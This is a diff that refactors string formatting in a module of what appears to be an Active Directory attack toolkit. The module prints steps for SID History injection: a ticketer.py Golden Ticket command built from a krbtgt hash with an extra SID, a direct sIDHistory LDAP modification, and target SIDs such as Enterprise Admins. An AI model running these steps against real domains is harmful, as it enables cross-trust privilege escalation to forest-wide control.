@@ -1,5 +1,4 @@
-"""SID History injection — cross-trust escalation via SID history attribute."""
-from __future__ import annotations
+"""SID History injection  -  cross-trust escalation via SID history attribute."""
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -27,19 +26,18 @@ def run(args: Any) -> int:
         return 1
 
     print("[*] SID History injection:")
-    print("  Target user: {}".format(target_user))
-    print("  Injected SID: {}".format(target_sid))
-    print("  DC: {}".format(dc_ip))
+    print(f"  Target user: {target_user}")
+    print(f"  Injected SID: {target_sid}")
+    print(f"  DC: {dc_ip}")
 
     if krbtgt_hash:
         print("\n[*] Using Golden Ticket with extra SID (recommended):")
-        print("  ticketer.py -nthash {} -domain-sid <child-SID> "
-              "-extra-sid {} -domain {} {}".format(
-                  krbtgt_hash, target_sid, args.domain, target_user))
+        print(f"  ticketer.py -nthash {krbtgt_hash} -domain-sid <child-SID> "
+              f"-extra-sid {target_sid} -domain {args.domain} {target_user}")
     else:
         print("\n[*] Direct LDAP injection (requires high privileges):")
-        print("  Modify sIDHistory attribute on {}".format(target_user))
-        print("  Append SID: {}".format(target_sid))
+        print(f"  Modify sIDHistory attribute on {target_user}")
+        print(f"  Append SID: {target_sid}")
 
     print("\n[*] Common target SIDs:")
     print("  Enterprise Admins: <forest-root-SID>-519")
